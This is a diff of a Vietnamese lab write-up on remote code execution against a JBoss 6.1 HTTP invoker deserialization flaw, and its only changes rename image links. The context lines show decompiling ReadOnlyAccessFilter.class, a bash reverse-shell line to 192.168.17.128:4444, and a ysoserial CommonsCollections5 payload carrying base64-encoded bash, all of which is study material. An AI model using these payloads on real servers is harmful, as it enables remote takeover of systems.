@@ -44,13 +44,13 @@ Truy cập vào endpoint thì t thấy đường dẫn này trả về lỗi 500
 
 Sau đó copy file tìm được ra máy bên ngoài và dùng jd-gui để dịch ngược file ra file java để có thể phân tích code
 
-![image.png](image%201.png)
+![image.png](image-1.png)
 
 bạn hãy gõ `exit` để thoát khỏi container đã. Sau đó, đứng ở terminal của Kali (phucquan@kali), copy và dán lệnh này:
 
 `sudo docker cp 5c0fd4476c4b:/jboss-6.1.0.Final/server/default/deploy/http-invoker.sar/invoker.war/WEB-INF/classes/org/jboss/invocation/http/servlet/ReadOnlyAccessFilter.class ./`
 
-![image.png](image%202.png)
+![image.png](image-2.png)
 
 **Giải thích:**
 
@@ -77,7 +77,7 @@ sudo apt update
 sudo apt install jd-gui
 - **Sử dụng:** Gõ `jd-gui ReadOnlyAccessFilter.class` để mở file.
 
-![image.png](image%203.png)
+![image.png](image-3.png)
 
 Và đây là toàn bộ source code 
 
@@ -269,7 +269,7 @@ Do phương thức `Runtime.getRuntime().exec()` trong Java không hỗ trợ tr
 
 **Lệnh gốc:**`bash -i >& /dev/tcp/192.168.17.128/4444 0>&1`
 
-![image.png](image%204.png)
+![image.png](image-4.png)
 
 Đây là hình ảnh lệnh sau khi encode
 
@@ -296,15 +296,15 @@ java -jar ysoserial.jar CommonsCollections5 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L
 
 Sau đó tôi thiết lập 1 máy nghe ở máy tấn công
 
-![image.png](image%205.png)
+![image.png](image-5.png)
 
 sau đó sử dụng lệnh curl để gửi dữ liệu tới hoặc là gửi bằng burpsuite cũng được 
 
-![image.png](image%206.png)
+![image.png](image-6.png)
 
 Và…. chúng ta đã RCE 
 
-![image.png](image%207.png)
+![image.png](image-7.png)
 
 Impact của CVE này lên tới 9.8/10 do dẫn tới RCE như trên , các attacker có thể hành động :
 
